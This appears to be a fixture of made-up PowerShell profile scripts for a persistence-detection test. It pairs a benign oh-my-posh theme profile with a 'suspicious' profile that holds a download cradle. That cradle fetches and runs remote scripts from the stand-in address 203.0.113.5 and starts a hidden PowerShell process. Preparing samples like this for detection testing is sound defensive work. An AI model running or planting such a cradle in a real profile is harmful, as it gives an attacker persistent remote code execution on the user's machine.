comment: Fictitious PowerShell profile scripts for tests/persistence.rs. Kept out of the test executable on purpose: the suspicious one looks like a download cradle.
suspicious_profile:
Set-Alias ll Get-ChildItem
$w = New-Object Net.WebClient
IEX ($w.DownloadString('http://203.0.113.5/p.ps1'))
Start-Process powershell -WindowStyle Hidden -ArgumentList '-nop -w hidden -c Invoke-Expression (iwr http://203.0.113.5/s)'
theme_profile:
oh-my-posh init pwsh --config "$env:POSH_THEMES_PATH\jandedobbeleer.omp.json" | Invoke-Expression
Import-Module Terminal-Icons
Set-PSReadLineOption -PredictionSource History
